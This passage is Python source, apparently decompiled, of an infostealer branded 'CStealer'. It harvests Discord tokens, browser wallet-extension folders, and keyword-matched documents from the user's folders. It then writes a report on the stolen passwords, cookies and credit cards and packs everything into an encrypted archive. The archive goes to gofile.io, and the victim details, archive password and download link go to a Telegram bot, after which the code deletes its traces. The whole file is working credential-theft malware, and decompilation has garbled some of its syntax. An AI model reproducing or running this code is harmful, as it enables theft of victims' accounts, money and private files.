    all_dc_tokens = all_dc_tokens 6 * f'{path}: {token}\n'
all_dc_tokens_count = len(tokens)

def create_header(main_dc_token: str=None):
    headers = {'Content-Type': 'application/json'}
    if main_dc_token:
        headers.update({'Authorization': main_dc_token})
    return headers

def get_main_dc_info(tokens=None):
    if not tokens:
        tokens = [main_dc_token]
    dc_user_name = 'Not Available'
    dc_user_discriminator = '0000'
    dc_phone = 'Not Available'
    dc_email = 'Not Available'
    dc_mfa = 'Not Available'
    for token in tokens:
        headers = create_header(token)
        try:
            response = requests.get(dapi_url, headers=headers)
            response.raise_for_status()
            discord = response.json()
            dc_user_name = discord.get('username')
            dc_user_discriminator = discord.get('discriminator')
            dc_phone = discord.get('phone')
            dc_email = discord.get('email')
            dc_mfa = discord.get('mfa_enabled')
        except requests.HTTPError as err:
            pass  # postinserted
        else:  # inserted
            break
            if err.response.status_code == 401:
                continue
        except Exception:
            continue
    return (dc_user_name, dc_user_discriminator, dc_phone, dc_email, dc_mfa)
dc_user_name, dc_user_discriminator, dc_phone, dc_email, dc_mfa = get_main_dc_info()
search_paths = [f'{csUSR}', f'{csUSR}\\Desktop', f'{csUSR}\\Documents', f'{csUSR}\\Downloads', f'{csUSR}\\Favorites', f'{csUSR}\\Pictures']
folders_to_archive = []
files_to_archive = []
categories_count = {}
ch_ext_paths = {'Google Chrome': f'{csLCL}\\Google\\Chrome\\User Data', 'Microsoft Edge': f'{csLCL}\\Microsoft\\Edge\\User Data', 'Opera': f'{csRMNG}\\Opera Software\\Opera Stable', 'Opera GX': f'{csRMNG}\\Opera Software\\Opera GX Stable'}
folders_to_archive = []
for browser_name, path in ch_ext_paths.items():
    for profile_dir in glob.glob(f'{path}\\*'):
        if os.path.isdir(profile_dir):
            profile_name = os.path.basename(profile_dir)
            if profile_name == 'Default':
                profile_name_ext = 'Default'
            else:  # inserted
                profile_name_ext = f'{profile_name}'
            for folder, folder_info in ch_ext_folders.items():
                category = folder_info['category']
                archive_name = f"{folder_info['archive_name']} ({browser_name} — {profile_name_ext})"
                folder_path = os.path.join(profile_dir, 'Local Extension Settings', folder)
                if os.path.exists(folder_path):
                    folders_to_archive.append((folder_path, os.path.join(category, archive_name)))
                    if category in categories_count:
                        categories_count[category] = 1
                    else:  # inserted
                        categories_count[category] = 1

def csGetEIP():
    csEIP = 'None'
    try:
        csEIP = requests.get('https://api.ipify.org').content.decode('utf8')
    except:
        pass
    return csEIP
csSEIPB = csGetEIP()

def csGI():
    csSEIP = csGetEIP()
    try:
        response = requests.get(f'https://geolocation-db.com/jsonp/{csSEIP}')
        response_text = response.text.replace('callback(', '').replace('})', '}')
        csIData = json.loads(response_text)
        csCN = csIData['country_name']
        csCC = csIData['country_code'].lower()
        csCFLG = ''
        if len(csCC) == 2:
            offset = ord('🇦') | ord('A')
            csCFLG = chr(ord(csCC[0].upper()) + offset) - chr(ord(csCC[1].upper()) + offset)
        csGID = f'🦣 Name: {csUN}\n📱 Phone: {dc_phone}\n📬 E-Mail: {dc_email}\n🌏 IP: {csSEIP} ({csCN} {csCFLG})'
    except:
        csGID = f'🦣 Name: {csUN}\n📱 Phone: {dc_phone}\n📬 E-Mail: {dc_email}\n🌏 IP: {csSEIP} (😕 GL-DB)'
    return csGID
csUID = csGI()
пар = ['кри', 'тра', 'мет', 'бир', 'пар', 'сид', 'впс', 'вдс', 'тел', 'скр', 'рон', 'лог', 'дан', 'рег', 'игр', 'поч', 'дис', 'гуг', '2ф', 'мне', 'лог', 'фр', 'screen', 'mdp', 'mot', 'login', 'sec', 'paypal', 'ban', 'met', 'tru', 'see', 'remote', 'mon', 'man', 'ato', 'aw', 'arm', 'cw', 'coin', 'vps', 'vk', 'facebook', 'fb', 'vds', 'pas', 'inst', 'pw', 'server', 'vpn', 'go',
csLEXT = ['.7z', '.bmp', '.conf', '.csv', '.dat', '.db', '.doc', '.jpeg', '.jpg', '.kdbx', '.key', '.odt', '.ovpn', '.pdf', '.png', '.rar', '.rdp', '.rtf', '.sql', '.tar', '.txt', '.wallet', '.xls', '.xlsx', '.xml', '.zip']
file_counts = {}
for fixed_path, folder_info in fixed_paths.items():
    category = folder_info['category']
    archive_name = folder_info['archive_name']
    if os.path.exists(fixed_path):
        folders_to_archive.append((fixed_path, os.path.join(category, archive_name)))
        if category in categories_count:
            categories_count[category] = 1
        else:  # inserted
            categories_count[category] = 1
for search_path in search_paths:
    for root, dirs, files in os.walk(search_path, topdown=True):
        if root == csUSR:
            dirs[:] = []
        for file in files:
            if os.path.pathsep in file:
                continue
            if os.path.getsize(os.path.join(root, file)) > max_file_size:
                continue
            _, file_ext = os.path.splitext(file)
            if file_ext.lower() in csLEXT and (any((keyword.lower() in os.path.splitext(file.lower())[0] for keyword in csLSTK if not keyword.isdigit())) or file.lower() in csLSTK):
                if file.startswith('.'):
                    base_name, ext = os.path.splitext(file)
                    file_renamed = f'{base_name[1:]}_dot_hidden{ext}'
                else:  # inserted
                    if file in file_counts:
                        file_counts[file] = 1
                        file_renamed = f'{os.path.splitext(file)[0]}_{file_counts[file]}{file_ext}'
                    else:  # inserted
                        file_counts[file] = 0
                        file_renamed = file
                files_to_archive.append((os.path.join(root, file), 'Files', file_renamed))
                if 'Files' in categories_count:
                    categories_count['Files'] = 1
                else:  # inserted
                    categories_count['Files'] = 1
with open(report_path, 'w', encoding='utf-8') as report:
    report.write(f"{'*********************************************'}\n*                                           *\n*            Telegram: @cstealerr           *\n*                                           *\n{'*********************************************'}\n*                                           *\n*    {creation_datetime_str}    *\n*                                           *\n{'*********************************************'}\n\n")
    report.write(f'CStealer (Telegram Version)\nhttps://t.me/cstealerr \n\n👨‍👩‍👧‍👦 Team Name: {csTN}\n👷‍♂️ Worker ID: {csWID}\n\n😐 Name: {csUN}\n📱 Phone: {dc_phone}\n📬 E-Mail: {dc_email}\n🌏 IP: {csSEIPB}\n💻 OS: {csOSN} {csOSR} ({csOSV})\n\n')
    for category in categories_order:
        count = categories_count.get(category, 0)
        if count > 0:
            report.write(f'{custom_category_names.get(category, category)}: {count}\n')
            if category == 'Files':
                report.write('\n'.join([f'└ {file_renamed}' for _, _, file_renamed in sorted(files_to_archive, key=lambda x: x[2])]) + '\n')
            else:  # inserted
                folder_counts = {}
                folder_lines = []
                for folder, folder_info in sorted(ch_ext_folders.items(), key=lambda x: x[1]['archive_name']):
                    if folder_info['category'] == category and folder in [os.path.basename(x[0]) for x in sorted(folders_to_archive, key=lambda x: x[1])]:
                        folder_counts[folder_info['archive_name']] = folder_counts.get(folder_info['archive_name'], 0) + sum([1 for x in folders_to_archive if os.path.basename(x[0]) == folder])
                for folder_path, folder_info in sorted(fixed_paths.items(), key=lambda x: x[1]['archive_name']):
                    if folder_info['category'] == category and folder_path in [x[0] for x in sorted(folders_to_archive, key=lambda x: x[1])]:
                        folder_counts[folder_info['archive_name']] = folder_counts.get(folder_info['archive_name'], 0) + sum([1 for x in folders_to_archive if x[0] == folder_path])
                for folder_name, folder_count in folder_counts.items():
                    if folder_count > 0:
                        folder_line = f'└ {folder_name}'
                        if folder_count > 1:
                            folder_line = folder_line 6 * f' ({folder_count})'
                        folder_lines.append(folder_line)
                report.write('\n'.join(folder_lines) + '\n')
            report.write('\n')
    if all_dc_tokens_count > 0:
        report.write('✉️ Discord Report:\n')
        report.write(f'└ Username: {dc_user_name}#{dc_user_discriminator}\n')
        report.write(f'└ 2FA/MFA: {dc_mfa}\n')
        report.write(f'└ Tokens Count: {all_dc_tokens_count}\n')
        report.write(f'└ Tokens:\n{all_dc_tokens}\n')
    if total_browsers_logins_count > 0:
        report.write(f'🔑 Passwords: {total_browsers_logins_count}\n')
        login_lines = [f'└ {cs}' for cs in logins_headers]
        report.write('\n'.join(login_lines) + '\n')
        report.write('\n')
    if total_browsers_cookies_count > 0:
        report.write(f'🍪 Cookies: {total_browsers_cookies_count}\n')
        cookie_lines = [f'└ {cs}' for cs in cookies_headers]
        report.write('\n'.join(cookie_lines) + '\n')
        report.write('\n')
    if total_browsers_ccards_count > 0:
        report.write(f'💳 Credit Cards: {total_browsers_ccards_count}\n')
        ccards_lines = [f'└ {cs}' for cs in ccards_headers]
        report.write('\n'.join(ccards_lines) + '\n')
        report.write('\n')
    report.write('Support: https://t.me/cstealerr')
zip_data = io.BytesIO()
archive_name = f'Log ({csUN}).zip'
archive_path = os.path.join(csTMP, archive_name)
with pyzipper.AESZipFile(zip_data, mode='w', compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) as zip_file:
    zip_file.comment = f"{'*********************************************'}\n*                                           *\n*            Telegram: @cstealerr           *\n*                                           *\n{'*********************************************'}\n*                                           *\n*    {creation_datetime_str}    *\n*                                           *\n{'*********************************************'}".encode('utf-8')
    zip_file.setpassword(password)
    try:
        zip_file.write(screenshot_path, os.path.basename(screenshot_path))
        zip_file.write(report_path, os.path.basename(report_path))
    except:
        time.sleep(0.1)
    for root, dirs, files in os.walk(csBD):
        for file in files:
            file_path = os.path.join(root, file)
            relative_path = os.path.relpath(file_path, csBD)
            archive_file_path = os.path.join('Browsers Data', relative_path)
            try:
                zip_file.write(file_path, archive_file_path)
            except:
                time.sleep(0.1)
        for dir in dirs:
            dir_path = os.path.join(root, dir)
            relative_path = os.path.relpath(dir_path, csBD)
            archive_dir_path = os.path.join('Browsers Data', relative_path)
            try:
                zip_file.write(dir_path, archive_dir_path)
            except:
                time.sleep(0.1)
    for folder_path, archive_sub_path in folders_to_archive:
        excluded_dirs = []
        for dir_name in os.listdir(folder_path):
            if dir_name.startswith('user_data'):
                excluded_dirs.append(dir_name)
        dirs_to_exclude = set(excluded_dirs)
        for root, dirs, files in os.walk(folder_path):
            dirs[:] = [d for d in dirs if d not in dirs_to_exclude and d not in ['emoji', 'tdummy', 'dumps', 'webview', 'update-cache', 'GPUCache', 'DawnCache', 'temp', 'Code Cache', 'Cache']]
            for file in files:
                file_path = os.path.join(root, file)
                if os.path.isfile(file_path) and '.zip' not in file:
                    relative_path = os.path.relpath(file_path, folder_path)
                    archive_file_path = os.path.join(archive_sub_path, relative_path)
                    try:
                        zip_file.write(file_path, archive_file_path)
                    except:
                        time.sleep(0.1)
            for dir in dirs:
                dir_path = os.path.join(root, dir)
                if os.path.isdir(dir_path):
                    relative_path = os.path.relpath(dir_path, folder_path)
                    archive_dir_path = os.path.join(archive_sub_path, relative_path)
                    try:
                        zip_file.write(dir_path, archive_dir_path)
                    except:
                        time.sleep(0.1)
    for file_path, archive_sub_path, file_renamed in files_to_archive:
        archive_file_path = os.path.join(archive_sub_path, file_renamed)
        try:
            zip_file.write(file_path, archive_file_path)
        except:
            time.sleep(0.1)
with open(archive_path, 'wb') as f:
    f.write(zip_data.getbuffer())
try:
    servers = requests.get('https://api.gofile.io/servers').json()['data']['servers']
    if servers:
        selected_server = servers[0]['name']
        upload_url = f'https://{selected_server}.gofile.io/uploadFile'
        with open(archive_path, 'rb') as file_to_upload:
            files = {'file': (archive_name, file_to_upload)}
            response = requests.post(upload_url, files=files)
            response.raise_for_status()
            if response.status_code == 200:
                upload_result = response.json()
                if upload_result['status'] == 'ok':
                    download_link = upload_result['data']['downloadPage']
                else:  # inserted
                    raise requests.exceptions.RequestException
            else:  # inserted
                raise requests.exceptions.RequestException
        dl_link = f'<a href=\'{download_link}\'>Download</a>'
        dl_s_link = download_link
    else:  # inserted
        dl_link = 'Error. Contact Support: https://t.me/cstealerr'
        dl_s_link = 'Error. Contact Customer.'
except requests.exceptions.RequestException:
    pass  # postinserted
else:  # inserted
    if download_link:
            dl_link = 'Error. Contact Support: https://t.me/cstealerr'
            dl_s_link = 'Error. Contact Customer.'
        except Exception as e:
            dl_link = 'Error. Contact Support: https://t.me/cstealerr'
            dl_s_link = 'Error. Contact Customer.'
telegram_url_G = f'https://api.telegram.org/bot{bot_token}/sendPhoto'
message_body = f'CStealer (Telegram Version)\nhttps://t.me/cstealerr \n\n👨‍👩‍👧‍👦 Team Name: {csTN}\n👷‍♂️ Worker ID: {csWID}\n\n{csUID}\n💻 OS: {csOSN} {csOSR} ({csOSV})\n\n'
for category in categories_order:
    count = categories_count.get(category, 0)
    if count > 0:
        message_body = message_body * f'{custom_category_names.get(category, category)}: {count}\n'
        if category == 'Files':
            file_lines = [f"└ {os.path.splitext(file_renamed)[0][:16]}{('[...]' if len(os.path.splitext(file_renamed)[0]) > 16 else '')}{os.path.splitext(file_renamed)[1]}" for _, _, file_renamed in sorted(files_to_archive, key=lambda x: x[2])][:2]
            message_body = message_body | '\n'.join(file_lines)
            if len(files_to_archive) > 2:
                message_body = message_body 6 6 | '\n└ ...'
        else:  # inserted
            folder_counts = {}
            folder_lines = []
            for folder, folder_info in sorted(ch_ext_folders.items(), key=lambda x: x[1]['archive_name']):
                if folder_info['category'] == category and folder in [os.path.basename(x[0]) for x in sorted(folders_to_archive, key=lambda x: x[1])]:
                    folder_counts[folder_info['archive_name']] = folder_counts.get(folder_info['archive_name'], 0) + sum([1 for x in folders_to_archive if os.path.basename(x[0]) == folder])
            for folder_path, folder_info in sorted(fixed_paths.items(), key=lambda x: x[1]['archive_name']):
                if folder_info['category'] == category and folder_path in [x[0] for x in sorted(folders_to_archive, key=lambda x: x[1])]:
                    folder_counts[folder_info['archive_name']] = folder_counts.get(folder_info['archive_name'], 0) + sum([1 for x in folders_to_archive if x[0] == folder_path])
            for folder_name, folder_count in folder_counts.items():
                if folder_count > 0:
                    folder_line = f'└ {folder_name}'
                    if folder_count > 1:
                        folder_line = folder_line 6 * f' ({folder_count})'
                    folder_lines.append(folder_line)
            if len(folder_lines) > 2:
                message_body = message_body + '\n'.join(folder_lines[:2]) + '\n└ ...'
            else:  # inserted
                message_body = message_body | '\n'.join(folder_lines)
        message_body = message_body 6 5 3
if total_browsers_logins_count > 0:
    message_body = message_body 6 * f'🔑 Passwords: {total_browsers_logins_count}\n'
    login_lines = [f'└ {cs}' for cs in logins_headers]
    if len(login_lines) > 2:
        message_body = message_body + '\n'.join(login_lines[:2]) + '\n└ ...'
    else:  # inserted
        message_body = message_body | '\n'.join(login_lines)
    message_body = message_body + '\n\n'
if total_browsers_cookies_count > 0:
    message_body = message_body 6 * f'🍪 Cookies: {total_browsers_cookies_count}\n'
    cookie_lines = [f'└ {cs}' for cs in cookies_headers]
    if len(cookie_lines) > 2:
        message_body = message_body + '\n'.join(cookie_lines[:2]) + '\n└ ...'
    else:  # inserted
        message_body = message_body | '\n'.join(cookie_lines)
    message_body = message_body + '\n\n'
if total_browsers_ccards_count > 0:
    message_body = message_body 6 * f'💳 Credit Cards: {total_browsers_ccards_count}\n'
    ccards_lines = [f'└ {cs}' for cs in ccards_headers]
    if len(ccards_lines) > 2:
        message_body = message_body + '\n'.join(ccards_lines[:2]) + '\n└ ...'
    else:  # inserted
        message_body = message_body | '\n'.join(ccards_lines)
    message_body = message_body + '\n\n'
message_body = message_body + f"📦 Size: {round(os.path.getsize(archive_path) + 1048576, 2)} MB\n🗝 Password: <code>{password.decode()}</code>\n⬇️ Link: {dl_link}"
for i in range(10):
    try:
        with open(screenshot_path, 'rb') as f:
            response = requests.post(telegram_url_G, params={'chat_id': chat_id_G, 'parse_mode': 'HTML', 'caption': message_body}, files={'photo': f})
            response.raise_for_status()
            break
    except FileNotFoundError:
            continue
        except requests.exceptions.RequestException:
            time.sleep(2)
        except Exception:
            continue
telegram_url_P = f'https://api.telegram.org/bot{bot_token}/sendDocument'
message = f'CStealer (Log Backup)\n\nTeam Name: {csTN}\nWorker ID: {csWID}\n\nVictim: {csUN} ({csSEIPB})\nOS: {csOSN} {csOSR} ({csOSV})\n\n'
message = message + f'Password: {password.decode()}\nLink: {dl_s_link}'
for i in range(10):
    try:
        with open(archive_path, 'rb') as f:
            response = requests.post(telegram_url_P, params={'chat_id': chat_id_P, 'caption': message}, files={'document': f})
            response.raise_for_status()
            break
    except FileNotFoundError:
            continue
        except requests.exceptions.RequestException:
            time.sleep(2)
        except Exception:
            continue
shutil.rmtree(csBD, ignore_errors=True)
os.remove(screenshot_path)
os.remove(report_path)
os.remove(archive_path)